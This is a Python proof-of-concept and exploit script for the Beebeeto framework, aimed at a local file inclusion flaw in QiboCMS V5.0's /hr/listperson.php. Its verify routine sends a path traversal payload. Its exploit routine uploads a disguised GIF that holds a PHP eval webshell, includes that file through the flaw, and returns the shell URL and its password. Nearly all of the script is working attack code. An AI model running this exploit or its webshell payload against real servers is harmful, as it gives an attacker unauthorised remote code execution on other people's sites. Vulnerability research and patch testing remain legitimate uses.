#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urlparse
import requests

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0024',  # 由Beebeeto官方编辑
            'name': 'QiboCMS V5.0 /hr/listperson.php 本地文件包含漏洞 POC & Exploit',  # 名称
            'author': 'WenR0',  # 作者
            'create_date': '2015-01-31',  # 编写日期
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',  # 该漏洞所涉及的协议名称
            'port': [80],  # 该协议常用的端口号，需为int类型
            'layer4_protocol': ['tcp'],  # 该协议
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Qibocms',  # 漏洞所涉及的应用名称
            'vul_version': ['v5.0'],  # 受漏洞影响的应用版本
            'type': 'Local File Inclusion',  # 漏洞类型
            'tag': ['Qibocms漏洞', 'Qibo getshell漏洞', '/hr/listperson.php', 'php'],  # 漏洞相关tag
            'desc': 'Qibocms /hr/listperson.php 系统文件包含致无限制Getshell',  # 漏洞描述
            'references': ['http://www.wooyun.org/bugs/wooyun-2015-081470',  # 参考链接
            ],
        },
    }

    @classmethod
    def verify(cls, args):
        payload = 'FidTpl[list]=../images/default/default.js'
        file_path = "/hr/listperson.php?%s" % payload
        verify_url = args['options']['target'] + file_path
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        html = requests.get(verify_url).content
        if 'var evt = (evt) ? evt : ((window.event) ? window.event : "");' in html:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
            return args
        return args


    @classmethod
    def exploit(cls, args):
        # 上传文件   upload file
        upload_file_url = '%s/hy/choose_pic.php' % args['options']['target']
        gif_file = {'postfile': ('test.gif', 'Gif89a <?php echo(md5("bb2"));@eval($_POST["bb2"]);', 'image/gif')}
        gif_data = {'action': 'upload'}
        upload_content = requests.post(upload_file_url, files=gif_file, data=gif_data).content
        # 获取文件的地址   get file url
        pic_reg = re.compile(r"""set_choooooooooooosed\('\d+','(.*)','.*'\);""")
        pic_file = pic_reg.findall(upload_content)
        pic_file = urlparse.urlparse((pic_file[0])[:-4]).path
        # 文件包含 is include?
        file_path = "/hr/listperson.php?FidTpl[list]=../%s" % pic_file
        webshell = '%s%s' % (args['options']['target'], file_path)
        # 验证是否成功  check
        page_content = requests.get(webshell).content
        if '0c72305dbeb0ed430b79ec9fc5fe8505' in page_content:
            args['success'] = True
            args['poc_ret']['webshell'] = webshell
            args['poc_ret']['post_password'] = 'bb2'
            return args
        return args
        

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())